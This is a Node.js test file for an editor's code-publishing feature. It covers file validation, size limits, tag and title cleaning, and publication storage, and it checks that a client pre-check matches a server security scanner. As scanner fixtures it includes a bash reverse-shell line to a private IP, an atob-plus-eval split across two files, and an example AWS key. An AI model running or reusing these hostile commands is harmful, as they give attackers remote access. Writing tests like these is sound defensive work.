// Run: node --test scripts/tests/
import assert from "node:assert/strict";
import test from "node:test";
import { load } from "./setup.mjs";

const media = await load("components/Editor/media-publish.ts");
const {
    MEDIA_LIMITS, normalizeMediaFiles, cleanMediaTags, splitMediaTags, cleanMediaTitle, cleanMediaDescription, normalizeMediaLicense,
    mediaScanText, locateScanLine, mediaLanguages, fitsMediaFile, advisorLanguageFor, ownerTag, isMediaPostId, mediaPostPath,
    parseStoredPublications, findStoredPublication, withStoredPublication, withoutStoredPost, parseMediaPublication,
} = media;

test("files are validated, renamed safely and get registry languages", () => {
    const result = normalizeMediaFiles([
        { name: "../../src/main.py", lang: "py", code: "print(1)" },
        { name: "MAIN.py", lang: "python", code: "print(2)" },
        { name: "", lang: "c++", code: "int main() {}" },
        { name: "notes.md", lang: "klingon", code: "# x" },
        { name: "data", code: "" },
    ]);
    assert.equal(result.ok, true);
    assert.deepEqual(result.files.map((file) => [file.name, file.lang]), [
        ["main.py", "python"], ["MAIN-2.py", "python"], ["file-3.cpp", "cpp"], ["notes.md", "markdown"], ["data", "plaintext"],
    ]);
    assert.equal(result.totalChars, 8 + 8 + 13 + 3);
});

test("file limits match the server", () => {
    assert.deepEqual(normalizeMediaFiles([]), { ok: false, error: "no_files" });
    assert.deepEqual(normalizeMediaFiles("x"), { ok: false, error: "invalid_files" });
    assert.deepEqual(normalizeMediaFiles([{ name: "a", code: 5 }]), { ok: false, error: "invalid_files" });
    assert.deepEqual(normalizeMediaFiles([{ name: 5, code: "" }]), { ok: false, error: "invalid_files" });
    assert.deepEqual(normalizeMediaFiles(Array.from({ length: MEDIA_LIMITS.files + 1 }, () => ({ code: "" }))), { ok: false, error: "too_many_files" });
    assert.deepEqual(normalizeMediaFiles([{ name: "big.txt", code: "x".repeat(MEDIA_LIMITS.fileChars + 1) }]), { ok: false, error: "file_too_large", name: "big.txt" });
    const half = "x".repeat(MEDIA_LIMITS.fileChars);
    assert.equal(normalizeMediaFiles([{ code: half }, { code: half }]).ok, true, "exactly 1 000 000 characters fit");
    assert.deepEqual(normalizeMediaFiles([{ code: half }, { code: half }, { code: "x" }]), { ok: false, error: "total_too_large" });
    assert.equal(fitsMediaFile("ğ".repeat(400_000)), true);
    assert.equal(fitsMediaFile("€".repeat(340_000)), false, "UTF-8 bytes are limited too (Firestore documents hold 1 MiB)");
    assert.equal(fitsMediaFile("€".repeat(330_000)), true);
});

test("tags, titles, descriptions and licenses are cleaned", () => {
    assert.deepEqual(splitMediaTags("web, araç;oyun، 工具、x"), ["web", "araç", "oyun", "工具", "x"]);
    assert.deepEqual(cleanMediaTags("Web, #Araç, web,  game   dev , İSTANBUL"), ["web", "araç", "game-dev", "istanbul"]);
    assert.deepEqual(cleanMediaTags(["a", "b", "c", "d", "e", "f", "g"]).length, 6);
    assert.equal(cleanMediaTags(["x".repeat(40)])[0].length, MEDIA_LIMITS.tagLength);
    assert.deepEqual(cleanMediaTags([1, null, "  ", "#"]), []);
    assert.equal(cleanMediaTitle("  Hesap\nmakinesi\u0000 "), "Hesap makinesi");
    assert.equal(cleanMediaTitle("x".repeat(150)).length, MEDIA_LIMITS.title);
    assert.equal(cleanMediaDescription("Satır 1\r\nSatır 2\u0007 "), "Satır 1\nSatır 2");
    assert.equal(normalizeMediaLicense("MIT"), "MIT");
    assert.equal(normalizeMediaLicense("WTFPL"), "all-rights-reserved");
});

test("the scanned text and its line mapping", () => {
    const files = [{ name: "a.py", code: "x\ny" }, { name: "b.js", code: "z" }];
    const text = mediaScanText(files);
    assert.equal(text, "// a.py\nx\ny\n// b.js\nz");
    assert.deepEqual(locateScanLine(files, 1), { index: 0, line: 0 });
    assert.deepEqual(locateScanLine(files, 3), { index: 0, line: 2 });
    assert.deepEqual(locateScanLine(files, 4), { index: 1, line: 0 });
    assert.deepEqual(locateScanLine(files, 5), { index: 1, line: 1 });
    assert.equal(locateScanLine(files, 6), null);
    assert.equal(locateScanLine(files, 0), null);
    assert.deepEqual(mediaLanguages([{ lang: "python" }, { lang: "python" }, { lang: "html" }]), ["python", "html"]);
    assert.equal(advisorLanguageFor("bash"), "shell");
    assert.equal(advisorLanguageFor("haskell"), undefined);
});

test("remembered publications are scoped to an account and a workspace", () => {
    const owner = ownerTag("Ada@Example.com");
    assert.equal(owner, ownerTag(" ada@example.com"));
    assert.notEqual(owner, ownerTag("bob@example.com"));
    assert.ok(!owner.includes("@"), "the address itself is not stored");
    const post = { postId: "0b8f2c6e-1d2a-4c55-9f00-123456789abc", title: "Demo", at: "2026-10-01T10:00:00.000Z" };
    let list = withStoredPublication([], owner, "project:1", post);
    assert.deepEqual(findStoredPublication(list, owner, "project:1"), post);
    assert.equal(findStoredPublication(list, ownerTag("bob@example.com"), "project:1"), null);
    // Saving the draft as another project moves the post there.
    list = withStoredPublication(list, owner, "project:2", post);
    assert.equal(findStoredPublication(list, owner, "project:1"), null);
    assert.deepEqual(findStoredPublication(list, owner, "project:2"), post);
    list = withStoredPublication(list, ownerTag("bob@example.com"), "project:2", { ...post, postId: "other-post-1" });
    assert.equal(withoutStoredPost(list, owner, post.postId).length, 1);
    assert.equal(withStoredPublication(list, owner, "project:2", null).length, 1);
    assert.deepEqual(parseStoredPublications(JSON.stringify(list)), list);
    assert.deepEqual(parseStoredPublications("{oops"), []);
    assert.deepEqual(parseStoredPublications(JSON.stringify([{ postId: "../x", owner, key: "k" }, { ...post, owner: "", key: "k" }])), []);
    assert.equal(parseMediaPublication({ postId: "abcdef", title: 5 }).title, "");
    assert.equal(isMediaPostId("abc"), false);
    assert.equal(mediaPostPath("a b"), "/media?post=a%20b");
});

const { runPrecheck, precheckKey } = await load("components/Editor/media-precheck.ts");
const { scanUntrustedCode } = await load("lib/server/security-scanner.ts");

test("the editor's pre-check blocks exactly what the server's guard blocks", async () => {
    const cases = [
        [{ id: "1", name: "ok.py", lang: "python", code: "print('merhaba')\n" }],
        [{ id: "1", name: "notes.md", lang: "markdown", code: "# Notlar" }, { id: "2", name: "shell.sh", lang: "bash", code: "echo hi\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n" }],
        // Split across files: only the combined text the server scans shows decoding + eval.
        [{ id: "1", name: "a.js", lang: "javascript", code: "const payload = atob(data);" }, { id: "2", name: "b.js", lang: "javascript", code: "eval(payload);" }],
    ];
    for (const files of cases) {
        const check = await runPrecheck(files);
        const server = scanUntrustedCode(mediaScanText(files));
        assert.equal(check.blocked.length > 0, !server.allowed, files.map((file) => file.name).join(", "));
        assert.equal(check.key, precheckKey(files));
    }
    const shell = await runPrecheck(cases[1]);
    assert.equal(shell.blocked[0].file, "shell.sh");
    assert.equal(shell.blocked[0].line, 2, "lines point into the file, not the combined text");
    assert.equal(shell.perFile["2"].worst, "critical");
});

test("secrets need attention but do not block; reports are cached per file", async () => {
    const cache = new Map();
    const files = [{ id: "k", name: "config.js", lang: "javascript", code: 'const awsKey = "AKIAIOSFODNN7EXAMPLE";\nconsole.log(1);\n' }];
    const check = await runPrecheck(files, cache);
    assert.equal(check.blocked.length, 0);
    assert.equal(check.secrets.length, 1);
    assert.equal(check.secrets[0].file, "config.js");
    assert.equal(cache.size, 1);
    const again = await runPrecheck(files, cache);
    assert.deepEqual(again.secrets.map((item) => item.key), check.secrets.map((item) => item.key));
});
